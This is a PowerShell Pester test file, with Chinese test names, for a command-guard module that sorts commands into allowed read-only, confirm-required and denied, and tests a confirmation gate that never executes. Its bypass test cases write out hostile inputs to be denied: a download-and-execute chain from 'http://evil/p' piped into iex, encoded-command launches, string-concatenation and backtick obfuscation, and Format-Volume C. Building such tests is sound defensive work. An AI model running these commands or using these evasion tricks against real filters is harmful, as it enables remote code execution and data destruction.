# OpsGuard C2 Pester 3.4 测试 (管道语法: $x | Should Be, 全用管道语法)
$ErrorActionPreference = 'Stop'
$modulePath = Join-Path $PSScriptRoot 'AstGuard.psm1'
$policyPath = Join-Path $PSScriptRoot 'Policy.psm1'
Import-Module $modulePath -Force
Import-Module $policyPath -Force

Describe 'OpsGuard C2 AstGuard 三态判定' {
    Context 'allow_readonly (白名单只读, 仅由白名单标记决定)' {
        It 'Get-Service -Name Spooler 应 allow_readonly' {
            $r = Assert-OGCommand -Command 'Get-Service -Name Spooler'
            $r.verdict | Should Be 'allow_readonly'
        }
        It 'Get-DnsClientServerAddress 应 allow_readonly' {
            $r = Assert-OGCommand -Command 'Get-DnsClientServerAddress -InterfaceIndex 12'
            $r.verdict | Should Be 'allow_readonly'
        }
        It 'Get-NetAdapter 应 allow_readonly' {
            $r = Assert-OGCommand -Command 'Get-NetAdapter -Name Ethernet'
            $r.verdict | Should Be 'allow_readonly'
        }
        It 'Get-WinEvent 应 allow_readonly' {
            $r = Assert-OGCommand -Command 'Get-WinEvent -LogName System -MaxEvents 20'
            $r.verdict | Should Be 'allow_readonly'
        }
        It 'ipconfig /all 应 allow_readonly' {
            $r = Assert-OGCommand -Command 'ipconfig /all'
            $r.verdict | Should Be 'allow_readonly'
        }
        It 'allow 判定必须带理由与命中节点' {
            $r = Assert-OGCommand -Command 'Get-Service -Name Spooler'
            $r.reason | Should Not BeNullOrEmpty
            $r.matched_node | Should Not BeNullOrEmpty
        }
    }
    Context 'require_confirm (白名单修改类)' {
        It 'Set-Service 应 require_confirm' {
            $r = Assert-OGCommand -Command 'Set-Service -Name Spooler -Status Running'
            $r.verdict | Should Be 'require_confirm'
        }
        It 'Set-DnsClientServerAddress 应 require_confirm' {
            $r = Assert-OGCommand -Command 'Set-DnsClientServerAddress -InterfaceIndex 12 -ServerAddresses 192.168.1.1'
            $r.verdict | Should Be 'require_confirm'
        }
        It 'require_confirm 判定需带理由' {
            $r = Assert-OGCommand -Command 'Set-Service -Name Spooler -Status Running'
            $r.reason | Should Not BeNullOrEmpty
        }
    }
    Context 'deny 明文与禁止清单' {
        It 'Remove-Service 应 deny' {
            (Assert-OGCommand -Command 'Remove-Service -Name Foo').verdict | Should Be 'deny'
        }
        It 'Format-Volume 应 deny' {
            (Assert-OGCommand -Command 'Format-Volume C').verdict | Should Be 'deny'
        }
        It '白名单外 Get-Process 应 deny' {
            (Assert-OGCommand -Command 'Get-Process').verdict | Should Be 'deny'
        }
        It '禁止清单在用户确认路径下仍拒' {
            $g = Assert-OGCommand -Command 'Remove-Service -Name Foo'
            $d = Get-OGPolicyDecision -GuardResult $g -ConfirmAnswer 'y'
            $d.decision | Should Be 'deny'
            $d.executed | Should Be $false
        }
    }
}

Describe 'OpsGuard C2 AstGuard 深层绕过 (调研报告全部变体 deny)' {
    $cases = @(
        @{ n='param缩写 -Stat'; c='Set-Service -Name Spooler -Stat Running' },
        @{ n='停止解析符 --%'; c='Get-Service -Name Spooler --% -foo bar' },
        @{ n='动态命令名 & $var'; c='& $n -Name Spooler' },
        @{ n='脚本块内命令'; c='& { Get-Service -Name Spooler }' },
        @{ n='Alias 覆盖'; c='gs -Name Spooler' },
        @{ n='Invoke-Expression'; c='Invoke-Expression "Get-Service"' },
        @{ n='iex'; c='iex Get-Service' },
        @{ n='下载执行链'; c='Invoke-WebRequest http://evil/p | iex' },
        @{ n='EncodedCommand'; c='powershell.exe -EncodedCommand ZZZ' },
        @{ n='enc 缩写'; c='powershell.exe -enc ZZZ' },
        @{ n='反引号'; c='Get-Service -Name Spo' + [string][char]96 + 'oler' },
        @{ n='字符串拼接命令名'; c='& ("Ge"+"t-Service") -Name Spooler' },
        @{ n='子表达式参数'; c='Get-Service -Name (Get-Content C:\x.txt)' }
    )
    foreach ($case in $cases) {
        It ($case.n + ' 应 deny') {
            $r = Assert-OGCommand -Command $case.c
            $r.verdict | Should Be 'deny'
            $r.reason | Should Not BeNullOrEmpty
        }
    }
    It '语法错误应 fail-closed deny' {
        (Assert-OGCommand -Command 'Get-Service -Name (').verdict | Should Be 'deny'
    }
}

Describe 'OpsGuard C2 Policy 确认门' {
    $g = Assert-OGCommand -Command 'Set-Service -Name Spooler -Status Running'
    It '默认无答案应 confirm_required' {
        (Get-OGPolicyDecision -GuardResult $g).decision | Should Be 'confirm_required'
    }
    It '默认 n 应 confirm_required' {
        (Get-OGPolicyDecision -GuardResult $g -ConfirmAnswer 'n').decision | Should Be 'confirm_required'
    }
    It '严格 y 应 confirmed (仅展示授权)' {
        (Get-OGPolicyDecision -GuardResult $g -ConfirmAnswer 'y').decision | Should Be 'confirmed'
    }
    It '确认门永不执行 (executed 恒 false)' {
        (Get-OGPolicyDecision -GuardResult $g -ConfirmAnswer 'y').executed | Should Be $false
    }
    It 'allow_readonly 直接放行' {
        $r = Assert-OGCommand -Command 'Get-Service -Name Spooler'
        (Get-OGPolicyDecision -GuardResult $r).decision | Should Be 'allow'
    }
}
